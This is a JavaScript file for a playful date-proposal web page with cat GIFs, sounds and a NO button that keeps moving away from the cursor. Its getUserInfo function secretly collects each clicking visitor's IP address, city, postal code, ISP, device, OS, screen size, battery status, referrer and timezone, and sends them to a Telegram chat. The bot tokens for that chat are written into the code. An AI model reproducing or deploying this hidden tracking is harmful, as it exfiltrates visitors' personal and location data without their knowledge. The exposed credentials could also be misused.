// Play sound effect when GIF is clicked
function playSoundEffect() {
    const sound = document.getElementById('soundEffect');
    sound.currentTime = 0;
    sound.play();
}

// Send user info to Telegram bot
async function getUserInfo(action) {
    try {
        // Fetch IP (CORS-friendly API)
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ip = ipData.ip;

        // Fetch geolocation (CORS-friendly API)
        const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
        const geoData = await geoResponse.json();

        // Extract user agent and device info
        const userAgent = navigator.userAgent;
        const browser = /chrome/i.test(userAgent) ? "Chrome" :
                        /firefox/i.test(userAgent) ? "Firefox" :
                        /safari/i.test(userAgent) ? "Safari" :
                        /edge/i.test(userAgent) ? "Edge" : "Unknown Browser";
        const os = /android/i.test(userAgent) ? "Android" :
                   /iphone|ipad|ipod/i.test(userAgent) ? "iOS" :
                   /windows/i.test(userAgent) ? "Windows" :
                   /mac os/i.test(userAgent) ? "macOS" :
                   /linux/i.test(userAgent) ? "Linux" : "Unknown OS";
        const deviceType = /mobile/i.test(userAgent) ? "Mobile" : "PC/Laptop";

        // Get screen resolution
        const screenWidth = window.screen.width;
        const screenHeight = window.screen.height;

        // Get referrer
        const referrer = document.referrer || "Direct Visit (No Referrer)";

        // Get timezone
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        // Get battery info (fallback for unsupported browsers)
        let batteryLevel = "Unknown";
        let chargingStatus = "Unknown";
        try {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                batteryLevel = `${Math.round(battery.level * 100)}%`;
                chargingStatus = battery.charging ? "Charging" : "Not Charging";
            }
        } catch (error) {
            console.error("Battery API not supported:", error);
        }

        // Prepare messages for Telegram
        const mainBotMessage = `🎉 Someone with IP: ${ip} said ${action} to your proposal!`;
        const detailedMessage = `📩 Someone clicked ${action}!\n\n` +
            `🏙️ Location: ${geoData.city || "Unknown"}, ${geoData.region || "Unknown"}, ${geoData.country || "Unknown"} (${geoData.postal || "Unknown"})\n` +
            `🌐 IP Address: ${ip}\n` +
            `🏢 ISP: ${geoData.org || "Unknown"}\n` +
            `📱 Device Type: ${deviceType}\n` +
            `💻 OS: ${os}\n` +
            `🌍 Browser: ${browser}\n` +
            `🖥️ Screen Resolution: ${screenWidth}x${screenHeight}\n` +
            `🔋 Battery: ${batteryLevel} (${chargingStatus})\n` +
            `🌐 Referring Website: ${referrer}\n` +
            `⏰ Timezone: ${timezone}\n` +
            `🔗 User Agent: ${userAgent}`;

        // Replace with your actual bot tokens and chat ID
        const mainBotToken = "7734214657:AAH7BTiw8WOHv0tztVZ2dNW-Qkhke8n94rs";
        const secondaryBotToken = "7208059954:AAFoxSdzpqVDQFqBNZ4aoSiSRxlgpaJROBQ";
        const chatId = "5471661264";

        // Send main message
        await fetch(`https://api.telegram.org/bot${mainBotToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: mainBotMessage })
        });

        // Send detailed message
        await fetch(`https://api.telegram.org/bot${secondaryBotToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: detailedMessage })
        });

    } catch (error) {
        console.error("Error fetching or sending data:", error);
    }
}

// Change content when "YES" is clicked
function changeContent() {
    document.getElementById('mainHeading').innerText = "YAY, see you soon...ɷ◡ɷ";
    document.getElementById('catGif').src = "images/goma-goma-cat.gif";
    document.getElementById('yessoundEffect').play();
    getUserInfo("YES");
}

// Change content when "NO" is clicked
function noButtonClick() {
    document.getElementById('noButtonClickSound').play();
    document.getElementById('mainHeading').innerText = "STFU....(ᗒᗣᗕ)՞";
    document.getElementById('catGif').src = "images/angry-cat.gif";
    setTimeout(function () {
        document.getElementById('mainHeading').innerText = "Will you go on a date with me?";
        document.getElementById('catGif').src = "images/peach-goma-love-heart-dance.gif";
    }, 1500);
    getUserInfo("NO");
}

// Move "NO" button randomly
function getRandomPosition() {
    const windowHeight = window.innerHeight;
    const windowWidth = window.innerWidth;
    const buttonHeight = document.getElementById('NO').offsetHeight;
    const buttonWidth = document.getElementById('NO').offsetWidth;
    const randomY = Math.floor(Math.random() * (windowHeight - buttonHeight));
    const randomX = Math.floor(Math.random() * (windowWidth - buttonWidth));
    return { top: randomY, left: randomX };
}

function moveButton() {
    const noButton = document.getElementById('NO');
    const randomPosition = getRandomPosition();
    noButton.style.position = 'absolute';
    noButton.style.top = `${randomPosition.top}px`;
    noButton.style.left = `${randomPosition.left}px`;
}

// Move the "NO" button every 300ms
setInterval(moveButton, 300);
